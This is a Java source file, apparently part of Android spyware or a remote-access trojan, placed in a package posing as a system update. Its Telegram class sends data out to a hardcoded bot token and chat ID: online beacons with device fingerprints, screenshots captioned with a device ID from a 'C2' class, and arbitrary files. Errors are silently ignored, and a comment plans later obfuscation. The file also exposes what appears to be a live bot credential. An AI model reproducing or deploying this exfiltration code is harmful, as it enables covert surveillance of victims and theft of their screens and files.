package com.system.update;

import android.os.Build;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public final class Telegram {

    // kept plain for lab reliability — wrap later via Obfuscate if needed
    public static final String BOT_TOKEN = "8623443889:AAHbp-xfYup6KzMJBmvy9Yhw8gY9kkPR7R8";
    public static final String CHAT_ID = "7079407562";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;
    private static final ExecutorService POOL = Executors.newFixedThreadPool(2);

    private Telegram() {}

    public static void send(String text) {
        POOL.execute(() -> {
            try {
                String body = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                        + "&text=" + URLEncoder.encode(text, "UTF-8")
                        + "&disable_web_page_preview=true";
                HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendMessage").openConnection();
                c.setConnectTimeout(15000);
                c.setReadTimeout(15000);
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
                try (OutputStream os = c.getOutputStream()) { os.write(bytes); }
                c.getResponseCode();
                c.disconnect();
            } catch (Throwable ignored) {}
        });
    }

    public static void sendPhotoJpeg(byte[] jpeg) {
        if (jpeg == null || jpeg.length == 0) return;
        POOL.execute(() -> {
            try {
                String boundary = "----Shriveled" + System.currentTimeMillis();
                HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendPhoto").openConnection();
                c.setConnectTimeout(20000);
                c.setReadTimeout(20000);
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                try (DataOutputStream out = new DataOutputStream(c.getOutputStream())) {
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                    out.writeBytes(CHAT_ID + "\r\n");
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    out.writeBytes("📸 " + C2.getDeviceId() + " | " + Build.MODEL + "\r\n");
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"screen.jpg\"\r\n");
                    out.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                    out.write(jpeg);
                    out.writeBytes("\r\n--" + boundary + "--\r\n");
                    out.flush();
                }
                c.getResponseCode();
                c.disconnect();
            } catch (Throwable ignored) {}
        });
    }

    public static void reportOnline(String deviceId, String model, String sdk) {
        String name = Build.DEVICE != null ? Build.DEVICE : "?";
        String brand = Build.BRAND != null ? Build.BRAND : "?";
        String man = Build.MANUFACTURER != null ? Build.MANUFACTURER : "?";
        send("🟢 ONLINE\n"
                + "device_name: " + brand + " " + model + "\n"
                + "device: " + name + "\n"
                + "id: " + deviceId + "\n"
                + "manufacturer: " + man + "\n"
                + "sdk: " + sdk + "\n"
                + "fingerprint: " + (Build.FINGERPRINT != null ? Build.FINGERPRINT : "") + "\n"
                + "tag: Telegram+/ShriveledVN");
    }

    public static void reportEvent(String deviceId, String event) {
        send("⚡ " + event + "\nid: " + deviceId + "\nname: " + Build.BRAND + " " + Build.MODEL);
    }

    public static void sendDocument(byte[] data, String filename, String caption) {
        if (data == null || data.length == 0) return;
        POOL.execute(() -> {
            try {
                String boundary = "----Doc" + System.currentTimeMillis();
                HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendDocument").openConnection();
                c.setConnectTimeout(30000);
                c.setReadTimeout(30000);
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                try (DataOutputStream out = new DataOutputStream(c.getOutputStream())) {
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                    out.writeBytes(CHAT_ID + "\r\n");
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    out.writeBytes((caption != null ? caption : "") + "\r\n");
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n");
                    out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                    out.write(data);
                    out.writeBytes("\r\n--" + boundary + "--\r\n");
                    out.flush();
                }
                c.getResponseCode();
                c.disconnect();
            } catch (Throwable ignored) {}
        });
    }

}
